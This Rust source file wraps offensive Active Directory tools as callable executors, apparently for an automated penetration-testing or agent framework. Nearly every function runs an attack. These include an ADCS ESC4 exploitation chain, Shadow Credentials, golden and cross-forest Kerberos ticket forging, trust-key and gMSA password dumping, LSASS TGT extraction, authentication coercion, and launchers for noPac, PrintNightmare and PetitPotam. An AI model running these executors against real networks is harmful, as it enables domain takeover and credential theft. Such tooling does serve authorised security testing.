//! Privilege escalation tool executors.
//!
//! Each function accepts a JSON `Value` containing the tool arguments and
//! returns a `ToolOutput` produced by running a CLI subprocess via
//! `CommandBuilder`.

use anyhow::Result;
use serde_json::Value;

#[allow(unused_imports)]
use crate::args::{optional_bool, optional_i64, optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

// ===========================================================================
// ADCS / Certipy
// ===========================================================================

/// Enumerate ADCS certificate templates and CAs using Certipy.
///
/// Required args: `username`, `domain`, `password`, `dc_ip`
/// Optional args: `vulnerable`
pub async fn certipy_find(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let vulnerable = optional_bool(args, "vulnerable").unwrap_or(false);

    let user_at_domain = format!("{username}@{domain}");

    CommandBuilder::new("certipy")
        .arg("find")
        .flag("-u", user_at_domain)
        .flag("-p", password)
        .flag("-dc-ip", dc_ip)
        .arg("-text")
        .arg_if(vulnerable, "-vulnerable")
        .timeout_secs(120)
        .execute()
        .await
}

/// Request a certificate from an ADCS CA using Certipy.
///
/// Required args: `username`, `domain`, `password`, `ca`, `template`, `dc_ip`
/// Optional args: `upn`
pub async fn certipy_request(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let ca = required_str(args, "ca")?;
    let template = required_str(args, "template")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let upn = optional_str(args, "upn");

    let user_at_domain = format!("{username}@{domain}");

    CommandBuilder::new("certipy")
        .arg("req")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-template", template)
        .flag("-dc-ip", dc_ip)
        .flag_opt("-upn", upn)
        .timeout_secs(120)
        .execute()
        .await
}

/// Authenticate with a PFX certificate using Certipy.
///
/// Required args: `pfx_path`, `dc_ip`, `domain`
pub async fn certipy_auth(args: &Value) -> Result<ToolOutput> {
    let pfx_path = required_str(args, "pfx_path")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let domain = required_str(args, "domain")?;

    CommandBuilder::new("certipy")
        .arg("auth")
        .flag("-pfx", pfx_path)
        .flag("-dc-ip", dc_ip)
        .flag("-domain", domain)
        .timeout_secs(120)
        .execute()
        .await
}

/// Perform Certipy Shadow Credentials attack (auto mode).
///
/// Required args: `username`, `domain`, `password`, `target`, `dc_ip`
pub async fn certipy_shadow(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let target = required_str(args, "target")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let user_at_domain = format!("{username}@{domain}");

    CommandBuilder::new("certipy")
        .arg("shadow")
        .arg("auto")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-account", target)
        .flag("-dc-ip", dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

/// Modify a certificate template for ESC4 exploitation using Certipy.
///
/// Required args: `username`, `domain`, `password`, `template`, `dc_ip`
pub async fn certipy_template_esc4(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let template = required_str(args, "template")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let user_at_domain = format!("{username}@{domain}");

    CommandBuilder::new("certipy")
        .arg("template")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-template", template)
        .flag("-dc-ip", dc_ip)
        .arg("-save-old")
        .timeout_secs(120)
        .execute()
        .await
}

/// Run the full ESC4 exploitation chain: template modification -> cert
/// request -> authentication.
///
/// Required args: `username`, `domain`, `password`, `template`, `dc_ip`,
///                `ca`, `pfx_path`
/// Optional args: `upn`
pub async fn certipy_esc4_full_chain(args: &Value) -> Result<ToolOutput> {
    // Step 1: Modify the template.
    let template_output = certipy_template_esc4(args).await?;

    // Step 2: Request a certificate using the modified template.
    let request_output = certipy_request(args).await?;

    // Step 3: Authenticate with the obtained PFX.
    let auth_output = certipy_auth(args).await?;

    // Combine all outputs into a single result.
    let combined_stdout = format!(
        "=== Step 1: Template Modification ===\n{}\n\
         === Step 2: Certificate Request ===\n{}\n\
         === Step 3: Authentication ===\n{}",
        template_output.stdout, request_output.stdout, auth_output.stdout
    );
    let combined_stderr = format!(
        "=== Step 1: Template Modification ===\n{}\n\
         === Step 2: Certificate Request ===\n{}\n\
         === Step 3: Authentication ===\n{}",
        template_output.stderr, request_output.stderr, auth_output.stderr
    );

    // The chain succeeds only if the final auth step succeeded.
    Ok(ToolOutput {
        stdout: combined_stdout,
        stderr: combined_stderr,
        exit_code: auth_output.exit_code,
        success: template_output.success && request_output.success && auth_output.success,
    })
}

// ===========================================================================
// Kerberos / Delegation
// ===========================================================================

/// Find delegation configurations in the domain using impacket-findDelegation.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`
pub async fn find_delegation(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let target = format!("{domain}/{username}:{password}");

    CommandBuilder::new("impacket-findDelegation")
        .arg(target)
        .flag("-dc-ip", dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

/// Perform an S4U (constrained delegation) attack to obtain a service ticket.
///
/// Required args: `domain`, `username`, `target_spn`, `impersonate`
/// Optional args: `password`, `hash`, `dc_ip`
pub async fn s4u_attack(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let target_spn = required_str(args, "target_spn")?;
    let impersonate = required_str(args, "impersonate")?;
    let dc_ip = optional_str(args, "dc_ip");

    let (target_str, extra_args) =
        credentials::impacket_auth(Some(domain), username, password, hash, domain);

    let mut cmd = CommandBuilder::new("impacket-getST")
        .flag("-spn", target_spn)
        .flag("-impersonate", impersonate)
        .arg(target_str)
        .args(extra_args)
        .timeout_secs(120);

    cmd = cmd.flag_opt("-dc-ip", dc_ip);

    cmd.execute().await
}

/// Generate a Kerberos golden ticket using impacket-ticketer.
///
/// Required args: `krbtgt_hash`, `domain_sid`, `domain`
/// Optional args: `extra_sid`
pub async fn generate_golden_ticket(args: &Value) -> Result<ToolOutput> {
    let krbtgt_hash = required_str(args, "krbtgt_hash")?;
    let domain_sid = required_str(args, "domain_sid")?;
    let domain = required_str(args, "domain")?;
    let extra_sid = optional_str(args, "extra_sid");

    CommandBuilder::new("impacket-ticketer")
        .flag("-nthash", krbtgt_hash)
        .flag("-domain-sid", domain_sid)
        .flag("-domain", domain)
        .flag_opt("-extra-sid", extra_sid)
        .flag("-user-id", "500")
        .arg("Administrator")
        .timeout_secs(120)
        .execute()
        .await
}

/// Add a computer account to the domain using impacket-addcomputer.
///
/// Required args: `domain`, `username`, `password`, `computer_name`,
///                `computer_password`, `dc_ip`
pub async fn add_computer(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let computer_name = required_str(args, "computer_name")?;
    let computer_password = required_str(args, "computer_password")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let target = format!("{domain}/{username}:{password}");

    CommandBuilder::new("impacket-addcomputer")
        .arg(target)
        .flag("-computer-name", computer_name)
        .flag("-computer-pass", computer_password)
        .flag("-dc-ip", dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

/// Add or remove an SPN on a target account using bloodyAD.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `action`,
///                `target_account`, `spn`
pub async fn addspn(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let action = required_str(args, "action")?;
    let target_account = required_str(args, "target_account")?;
    let spn = required_str(args, "spn")?;

    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);

    CommandBuilder::new("bloodyAD")
        .args(creds)
        .arg(action)
        .arg("spn")
        .arg(target_account)
        .arg(spn)
        .timeout_secs(120)
        .execute()
        .await
}

/// Write Resource-Based Constrained Delegation (RBCD) via impacket-rbcd.
///
/// Required args: `domain`, `username`, `password`, `target_computer`,
///                `attacker_sid`, `dc_ip`
pub async fn rbcd_write(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let target_computer = required_str(args, "target_computer")?;
    let attacker_sid = required_str(args, "attacker_sid")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let target = format!("{domain}/{username}:{password}");

    CommandBuilder::new("impacket-rbcd")
        .flag("-delegate-to", target_computer)
        .flag("-delegate-from", attacker_sid)
        .flag("-action", "write")
        .flag("-dc-ip", dc_ip)
        .arg(target)
        .timeout_secs(120)
        .execute()
        .await
}

/// Run KrbRelayUp for local privilege escalation via Kerberos relay.
///
/// Required args: `domain`, `dc_ip`
/// Optional args: `method`, `create_user`, `create_password`
pub async fn krbrelayup(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let method = optional_str(args, "method");
    let create_user = optional_str(args, "create_user");
    let create_password = optional_str(args, "create_password");

    CommandBuilder::new("KrbRelayUp")
        .arg("relay")
        .flag("-d", domain)
        .flag("-dc", dc_ip)
        .flag_opt("-m", method)
        .flag_opt("-cls", create_user)
        .flag_opt("-cp", create_password)
        .timeout_secs(120)
        .execute()
        .await
}

/// Escalate from child domain to parent domain using raiseChild.py.
///
/// Required args: `child_domain`, `username`, `password`
/// Optional args: `target_domain`
pub async fn raise_child(args: &Value) -> Result<ToolOutput> {
    let child_domain = required_str(args, "child_domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let target_domain = optional_str(args, "target_domain");

    let target = format!("{child_domain}/{username}:{password}");

    CommandBuilder::new("raiseChild.py")
        .arg(target)
        .flag_opt("-target-domain", target_domain)
        .timeout_secs(120)
        .execute()
        .await
}

// ===========================================================================
// Trust / Cross-forest
// ===========================================================================

/// Extract trust keys by dumping secrets for a trusted domain's machine account.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `trusted_domain`
pub async fn extract_trust_key(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let trusted_domain = required_str(args, "trusted_domain")?;

    let (target_str, extra_args) =
        credentials::impacket_auth(Some(domain), username, Some(password), None, dc_ip);

    let just_dc_user = format!("{trusted_domain}$");

    CommandBuilder::new("impacket-secretsdump")
        .arg(target_str)
        .args(extra_args)
        .flag("-just-dc-user", just_dc_user)
        .timeout_secs(120)
        .execute()
        .await
}

/// Create an inter-realm / cross-forest Kerberos ticket using impacket-ticketer.
///
/// Required args: `trust_key`, `source_sid`, `source_domain`, `target_sid`,
///                `target_domain`
/// Optional args: `username`
pub async fn create_inter_realm_ticket(args: &Value) -> Result<ToolOutput> {
    let trust_key = required_str(args, "trust_key")?;
    let source_sid = required_str(args, "source_sid")?;
    let source_domain = required_str(args, "source_domain")?;
    let target_sid = required_str(args, "target_sid")?;
    let target_domain = required_str(args, "target_domain")?;
    let username = optional_str(args, "username").unwrap_or("Administrator");

    let extra_sid = format!("{target_sid}-519");
    let spn = format!("krbtgt/{target_domain}");

    CommandBuilder::new("impacket-ticketer")
        .flag("-nthash", trust_key)
        .flag("-domain-sid", source_sid)
        .flag("-domain", source_domain)
        .flag("-extra-sid", extra_sid)
        .flag("-spn", spn)
        .arg(username)
        .timeout_secs(120)
        .execute()
        .await
}

/// Look up domain SIDs using impacket-lookupsid.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`
pub async fn get_sid(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let (target_str, extra_args) =
        credentials::impacket_auth(Some(domain), username, Some(password), None, dc_ip);

    CommandBuilder::new("impacket-lookupsid")
        .arg(target_str)
        .args(extra_args)
        .timeout_secs(120)
        .execute()
        .await
}

/// Manage DNS records using dnstool.py.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `record_name`,
///                `record_data`
/// Optional args: `action` (defaults to "add")
pub async fn dnstool(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let record_name = required_str(args, "record_name")?;
    let record_data = required_str(args, "record_data")?;
    let action = optional_str(args, "action").unwrap_or("add");

    let user_spec = format!("{domain}\\{username}");

    CommandBuilder::new("dnstool.py")
        .flag("-dc-ip", dc_ip)
        .flag("-u", user_spec)
        .flag("-p", password)
        .flag("-a", action)
        .flag("-r", record_name)
        .flag("-d", record_data)
        .arg(dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

// ===========================================================================
// gMSA / Unconstrained Delegation
// ===========================================================================

/// Dump gMSA passwords using netexec's gmsa module.
///
/// Required args: `dc_ip`, `username`, `password`, `domain`
pub async fn gmsa_dump_passwords(args: &Value) -> Result<ToolOutput> {
    let dc_ip = required_str(args, "dc_ip")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let domain = optional_str(args, "domain");

    let creds = credentials::netexec_creds(username, password, None, domain);

    CommandBuilder::new("netexec")
        .arg("ldap")
        .arg(dc_ip)
        .args(creds)
        .args(["-M", "gmsa"])
        .timeout_secs(120)
        .execute()
        .await
}

/// Dump TGTs from memory on an unconstrained delegation host using lsassy.
///
/// Required args: `domain`, `username`, `password`, `target_host`
pub async fn unconstrained_tgt_dump(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let target_host = required_str(args, "target_host")?;

    CommandBuilder::new("lsassy")
        .flag("-d", domain)
        .flag("-u", username)
        .flag("-p", password)
        .arg(target_host)
        .args(["-m", "direct"])
        .timeout_secs(180)
        .execute()
        .await
}

/// Coerce authentication from a remote host using printerbug.py (SpoolService).
///
/// Required args: `domain`, `username`, `password`, `coerce_from`, `listener_ip`
pub async fn unconstrained_coerce_and_capture(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let coerce_from = required_str(args, "coerce_from")?;
    let listener_ip = required_str(args, "listener_ip")?;

    let creds = format!("{domain}/{username}:{password}@{coerce_from}");

    CommandBuilder::new("printerbug.py")
        .arg(creds)
        .arg(listener_ip)
        .timeout_secs(60)
        .execute()
        .await
}

// ===========================================================================
// CVE Exploits
// ===========================================================================

/// Exploit CVE-2021-42278/CVE-2021-42287 (sAMAccountName spoofing / noPac).
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `dc_host`
/// Optional args: `target_user`, `shell`
pub async fn nopac(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let dc_host = required_str(args, "dc_host")?;
    let target_user = optional_str(args, "target_user");
    let shell = optional_bool(args, "shell").unwrap_or(false);

    let target = format!("{domain}/{username}:{password}");

    CommandBuilder::new("noPac.py")
        .arg(target)
        .flag("-dc-ip", dc_ip)
        .flag("-dc-host", dc_host)
        .flag_opt("-impersonate", target_user)
        .arg_if(shell, "--shell")
        .timeout_secs(120)
        .execute()
        .await
}

/// Exploit CVE-2021-1675 (PrintNightmare) for remote code execution.
///
/// Required args: `domain`, `username`, `password`, `target`, `dll_path`
pub async fn printnightmare(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let target = required_str(args, "target")?;
    let dll_path = required_str(args, "dll_path")?;

    let creds = format!("{domain}/{username}:{password}@{target}");

    CommandBuilder::new("CVE-2021-1675.py")
        .arg(creds)
        .arg(dll_path)
        .timeout_secs(120)
        .execute()
        .await
}

/// Exploit PetitPotam (unauthenticated NTLM relay coercion).
///
/// Required args: `listener`, `target`
pub async fn petitpotam_unauth(args: &Value) -> Result<ToolOutput> {
    let listener = required_str(args, "listener")?;
    let target = required_str(args, "target")?;

    CommandBuilder::new("PetitPotam.py")
        .arg(listener)
        .arg(target)
        .timeout_secs(60)
        .execute()
        .await
}

// ===========================================================================
// Tests
// ===========================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn test_certipy_find_requires_username() {
        let args = json!({});
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(certipy_find(&args));
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("username"));
    }

    #[test]
    fn test_generate_golden_ticket_requires_hash() {
        let args = json!({});
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(generate_golden_ticket(&args));
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("krbtgt_hash"));
    }

    #[test]
    fn test_petitpotam_requires_listener() {
        let args = json!({});
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(petitpotam_unauth(&args));
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("listener"));
    }
}
